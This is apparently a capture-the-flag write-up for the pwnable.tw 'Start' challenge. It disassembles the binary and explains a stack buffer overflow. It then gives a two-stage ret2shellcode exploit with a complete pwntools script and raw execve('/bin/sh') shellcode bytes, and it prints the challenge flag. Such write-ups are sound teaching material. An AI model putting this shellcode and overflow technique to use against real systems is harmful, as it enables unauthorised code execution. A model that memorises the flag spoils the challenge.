---
layout: page
title: "Start"
major_type: CTF
parent_group: pwnable.tw
summary: "Introduction to pwnable.tw: Leaking a stack pointer to execute shellcode on the stack via ret2shellcode."
---

**Flag:** `FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}`

## Approach (Step by Step)

1. The challenge provides a binary named `start`. Running `file` and `checksec` on it reveals it's a 32-bit statically linked executable with almost all binary protections disabled (No Canary, NX disabled, No PIE).
2. The binary is extremely small (564 bytes) and only contains `_start` and `_exit` routines.
3. Disassembling `_start` in `gdb`:

```nasm
0x8048060 <_start>:    push   esp
0x8048061 <_start+1>:  push   0x804809d      ; push address of _exit
0x8048066 <_start+6>:  xor    eax,eax
0x8048068 <_start+8>:  xor    ebx,ebx
0x804806a <_start+10>: xor    ecx,ecx
0x804806c <_start+12>: xor    edx,edx
0x804806e <_start+14>: push   0x3a465443     ; "CTF:"
0x8048073 <_start+19>: push   0x20656874     ; "the "
0x8048078 <_start+24>: push   0x20747261     ; "art "
0x804807d <_start+29>: push   0x74732073     ; "s st"
0x8048082 <_start+34>: push   0x2774654c     ; "Let'"
0x8048087 <_start+39>: mov    ecx,esp        ; ecx points to the string
0x8048089 <_start+41>: mov    dl,0x14        ; length = 20
0x804808b <_start+43>: mov    bl,0x1         ; fd = stdout
0x804808d <_start+45>: mov    al,0x4         ; sys_write
0x804808f <_start+47>: int    0x80           ; write(1, "Let's start the CTF:", 20)
0x8048091 <_start+49>: xor    ebx,ebx        ; fd = stdin
0x8048093 <_start+51>: mov    dl,0x3c        ; length = 60
0x8048095 <_start+53>: mov    al,0x3         ; sys_read
0x8048097 <_start+55>: int    0x80           ; read(0, esp, 60)
0x8048099 <_start+57>: add    esp,0x14       ; clean up the string from stack
0x804809c <_start+60>: ret                   ; jump to return address
```

4. The program pushes the string `"Let's start the CTF:"` onto the stack (20 bytes), then calls `sys_write` to print it. 
5. It then calls `sys_read` to read up to 60 bytes into the stack buffer. 
6. After reading, it adds `0x14` (20 bytes) to `esp`, effectively bypassing the string we printed, and executes `ret`. The address it returns to is the `_exit` address pushed at `0x8048061`.
7. **Vulnerability:** Since we can read 60 bytes but the buffer is only 20 bytes away from the return address, we have a classic buffer overflow. We need `20` bytes of padding to reach the return address, leaving us `60 - 24 = 36` bytes for our shellcode.

### Stage 1: Stack Leak
Since ASLR is likely enabled on the remote server and the stack address changes, we cannot jump to our shellcode directly. We need a stack leak first.
We can overwrite the return address with the address of the `sys_write` call within the binary itself (`0x08048087`).

```python
payload  = b'A' * 20
payload += p32(0x08048087)
```
When `ret` is executed, it jumps back to `mov ecx, esp`, but `esp` now points further down the stack to a saved stack pointer. The `write` syscall will leak 20 bytes from the stack including this stack address, and then the program will execute `sys_read` again, waiting for a second payload!

### Stage 2: Shellcode Execution
By receiving the first 4 bytes from the leak, we can calculate the exact address where our shellcode will be stored (`esp + 20`).
We can then send a second payload that overwrites the return address with the address of our shellcode, followed by the shellcode itself.

```python
shellcode_addr = esp + 0x14
payload  = b'A' * 20
payload += p32(shellcode_addr)
payload += shellcode
```

### Exploit Script

```python
from pwn import *

context.arch = 'i386'
context.os = 'linux'

# p = process('./start')
p = remote('chall.pwnable.tw', 10000)

# 25-byte execve("/bin/sh") shellcode
shellcode  = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
shellcode += b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
shellcode += b"\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"

# Receive initial banner
p.recvuntil(b'CTF:')

# Stage 1 - Leak stack
leak_gadget = 0x08048087

payload  = b'A' * 20
payload += p32(leak_gadget)

p.send(payload)

# Receive leaked ESP
leak = p.recv(20)
esp = u32(leak[:4])

log.success(f'Leaked ESP: {hex(esp)}')

# Shellcode will be after RET
shellcode_addr = esp + 0x14
log.info(f'Shellcode addr: {hex(shellcode_addr)}')

# Stage 2 - Execute shellcode
payload  = b'A' * 20
payload += p32(shellcode_addr)
payload += shellcode

p.send(payload)

p.interactive()
```
